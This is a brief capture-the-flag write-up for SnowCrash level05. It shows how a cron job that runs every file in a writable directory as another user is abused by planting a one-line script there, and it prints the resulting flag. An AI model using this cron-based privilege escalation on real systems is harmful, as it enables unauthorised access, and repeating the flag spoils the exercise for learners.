# level05

![[Welcome message.png]]

`cat /var/mail/level05`
![[mail.png]]
> cron job that will execute `sh /usr/sbin/openarenaserver` as user `flag05`

`cat /usr/sbin/openarenaserver`
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
> executes every file in /opt/openarenaserver then deletes it

`echo 'getflag > /tmp/flag' > /opt/openarenaserver/s1.sh`

After 2 minutes:
`cat /tmp/flag`
![[SnowCrash/Flag05/flag.png]]
### Flag = viuaaale9huek52boumoomioc